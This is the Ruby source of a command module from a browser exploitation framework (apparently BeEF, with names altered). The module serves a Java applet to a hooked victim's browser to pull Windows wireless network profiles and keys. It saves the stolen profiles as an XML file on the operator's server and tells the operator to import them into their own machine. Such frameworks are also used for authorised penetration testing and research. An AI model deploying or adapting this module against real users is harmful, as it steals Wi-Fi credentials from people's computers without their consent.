#
# Copyright (c) 2006-2025 Wade Alcorn - wade@bindshell.net
# Browser Exploitation Framework (Server) - https://serverproject.com
# See the file 'doc/COPYING' for copying permission
#
class Get_wireless_keys < Server::Core::Command
  def pre_send
    Server::Core::NetworkStack::Handlers::AssetHandler.instance.bind('/modules/host/get_wireless_keys/wirelessZeroConfig.jar', '/wirelessZeroConfig', 'jar')
  end

  def post_execute
    content = {}
    content['result'] = @datastore['result'].to_s
    save content
    filename = "#{$home_dir}/exported_wlan_profiles_#{ip}_-_#{timestamp}_#{@datastore['cid']}.xml"
    f = File.open(filename, 'w+')
    f.write((@datastore['results']).sub('result=', ''))
    writeToResults = {}
    writeToResults['data'] = "Please import #{filename} into your windows machine"
    Server::Core::Models::Command.save_result(@datastore['serverhook'], @datastore['cid'], @friendlyname, writeToResults, 0)
    Server::Core::NetworkStack::Handlers::AssetHandler.instance.unbind('/wirelessZeroConfig.jar')
  end
end
